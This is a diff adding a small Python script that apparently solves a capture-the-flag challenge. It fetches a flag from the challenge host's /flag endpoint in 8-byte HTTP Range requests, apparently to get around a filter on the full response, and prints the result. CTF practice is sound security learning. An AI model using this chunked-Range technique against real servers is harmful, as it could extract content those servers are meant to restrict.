@@ -1,0 +1,40 @@
+import requests
+
+url = "http://abdo-ctf.duckdns.org:49598/flag"
+headers = {
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+    "Connection": "keep-alive",
+    "Host": "abdo-ctf.duckdns.org:49598",
+    "Referer": "http://abdo-ctf.duckdns.org:49598/",
+    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+}
+
+# Initialize variables
+content = b""
+start_byte = 0
+chunk_size = 8
+
+while True:
+    # Set the Range header to request 8 bytes
+    headers["Range"] = f"bytes={start_byte}-{start_byte + chunk_size - 1}"
+    
+    # Make the GET request with the Range header
+    response = requests.get(url, headers=headers)
+    
+    # Check if the server returned a 206 Partial Content response
+    if response.status_code == 206:
+        # Append the content to the total content
+        content += response.content
+        
+        # Increment the start_byte for the next range
+        start_byte += chunk_size
+    else:
+        # Break the loop if the response status is not 206
+        break
+
+# Decode the combined content and print the result
+print("working")
+print(content.decode())
